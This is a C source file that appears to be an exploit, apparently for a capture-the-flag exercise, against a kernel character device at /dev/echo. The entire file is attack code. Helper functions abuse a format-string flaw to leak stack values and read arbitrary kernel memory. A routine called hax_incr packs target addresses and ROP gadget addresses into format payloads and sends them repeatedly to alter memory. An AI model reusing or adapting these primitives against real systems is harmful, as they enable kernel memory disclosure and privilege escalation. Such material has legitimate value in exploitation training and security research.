#include "libpwn.h"

#define DEV_PATH "/dev/echo"
#define BUF_SZ   0x200

size_t fmt_ptr;
size_t mov_rax_qword_ptr_rdi_38, ret;

int open_device() {
    int fd = open(DEV_PATH, O_RDWR);
    if (fd < 0) error("open");
    return fd;
}

static ssize_t echo_write(int fd, const void *buf, size_t len) {
    ssize_t w = write(fd, buf, len);
    if (w < 0) error("write");
    return w;
}

static ssize_t echo_read(int fd, void *buf, size_t maxlen) {
    ssize_t r = read(fd, buf, maxlen);
    if (r < 0) error("read");
    return r;
}

char *leak_string(uint64_t addr) {
    char fmt[BUF_SZ] = {0};
    int n;
    memcpy(fmt, &addr, sizeof(addr));
    for (int i = 0; i < 3; i++) strcat(fmt, "%i");
    strcat(fmt, " %s");
    n = echo_write(fd, fmt, sizeof(addr) + strlen(fmt + sizeof(addr)));
    char buf[BUF_SZ];
    n = echo_read(fd, buf, sizeof(buf) - 1);
    if (n < 0) return NULL;
    buf[n] = '\0';
    char *last_space = strrchr(buf, ' ');
    char *out = strdup(last_space + 1);
    return out;
}
size_t leak_stack(int idx) {
    char fmt[BUF_SZ] = {0};
    int n;
    for (int i = 0; i < idx; i++)strcat(fmt, "%i");
    strcat(fmt, " %px");
    n = echo_write(fd, fmt, strlen(fmt));
    char buf[BUF_SZ];
    n = echo_read(fd, buf, sizeof(buf) - 1);
    buf[n] = '\0';
    char *last_space = strrchr(buf, ' ');
    return strtoull(last_space + 1, NULL, 16);
}

void hax_incr(size_t addr, size_t amount){
    char fmt[BUF_SZ] = {0};
    size_t pos = 0;
    uint64_t tmp1 = fmt_ptr + 0x18;

    memcpy(fmt + pos, &tmp1, sizeof(tmp1)); 
    pos += sizeof(tmp1);
    const char seg[] = ".%x.%x.%x.%pfw..";
    memcpy(fmt + pos, seg, sizeof(seg) - 1); 
    pos += sizeof(seg) - 1;
    tmp1 = 0x1122334455667788ULL;
    memcpy(fmt + pos, &tmp1, sizeof(tmp1)); 
    pos += sizeof(tmp1);
    tmp1 = fmt_ptr + 0x28;
    memcpy(fmt + pos, &tmp1, sizeof(tmp1)); 
    pos += sizeof(tmp1);

    for (int i = 0; i < 5; i++) {
        memcpy(fmt + pos, &ret, sizeof(ret));
        pos += sizeof(ret);
    }

    memcpy(fmt + pos, &addr, sizeof(addr)); 
    pos += sizeof(addr);

    for (int i = 0; i < 5; i++) {
        memcpy(fmt + pos, &ret, sizeof(ret));
        pos += sizeof(ret);
    }

    memcpy(fmt + pos, &mov_rax_qword_ptr_rdi_38, sizeof(mov_rax_qword_ptr_rdi_38)); 
    pos += sizeof(mov_rax_qword_ptr_rdi_38);
    char buf[BUF_SZ];
    dump_hex(fmt, 0x90);

    for (int i = 0; i < amount; i++) {
        echo_write(fd, fmt, pos);
        echo_read(fd, buf, sizeof(buf) - 1);
    }
}